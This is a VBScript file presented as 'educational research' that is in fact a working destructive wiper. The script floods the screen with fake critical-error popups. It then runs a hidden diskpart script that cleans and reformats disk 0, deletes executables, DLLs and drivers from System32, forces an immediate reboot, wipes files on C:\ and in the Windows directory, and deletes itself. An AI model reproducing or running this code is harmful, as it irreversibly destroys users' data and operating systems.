' instant_destructor.vbs - No timers, immediate destruction
' Educational research only - CATShadow

Option Explicit
Dim objShell, objFSO, sTempPath, iCounter
Dim sDiskpartScript, sScriptFile, objTextFile, sWinDir

Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
sTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")

' IMMEDIATE: Popup spam (50 popups instantly)
For iCounter = 0 To 49
    objShell.Popup "SYSTEM CRITICAL ERROR #" & iCounter & vbCrLf & _
                   "IMMEDIATE DESTRUCTION INITIATED" & vbCrLf & _
                   "SYSTEM UNRECOVERABLE", _
                   0, "FATAL ERROR", 16
Next

' IMMEDIATE: Corrupt boot via diskpart FIRST (before anything else)
sDiskpartScript = "select disk 0" & vbCrLf & _
                  "clean" & vbCrLf & _
                  "create partition primary" & vbCrLf & _
                  "format fs=ntfs quick" & vbCrLf & _
                  "exit"
sScriptFile = sTempPath & "\diskpart_kill.txt"

Set objTextFile = objFSO.CreateTextFile(sScriptFile, True)
objTextFile.Write sDiskpartScript
objTextFile.Close

' Execute diskpart IMMEDIATELY (this destroys boot)
objShell.Run "diskpart /s """ & sScriptFile & """", 0, False

' IMMEDIATE: Delete critical system files
sWinDir = objShell.ExpandEnvironmentStrings("%WINDIR%")
On Error Resume Next
objFSO.DeleteFile sWinDir & "\System32\*.dll", True
objFSO.DeleteFile sWinDir & "\System32\drivers\*.sys", True
objFSO.DeleteFile sWinDir & "\System32\*.exe", True

' IMMEDIATE: Force reboot with NO DELAY
objShell.Run "shutdown /r /f /t 0", 0, False

' IMMEDIATE: Additional destruction (runs during shutdown)
objShell.Run "cmd /c del /f /q C:\*.*", 0, False
objShell.Run "cmd /c del /f /q " & sWinDir & "\*.*", 0, False

' Self-delete VBScript (if there's time)
On Error Resume Next
objFSO.DeleteFile WScript.ScriptFullName
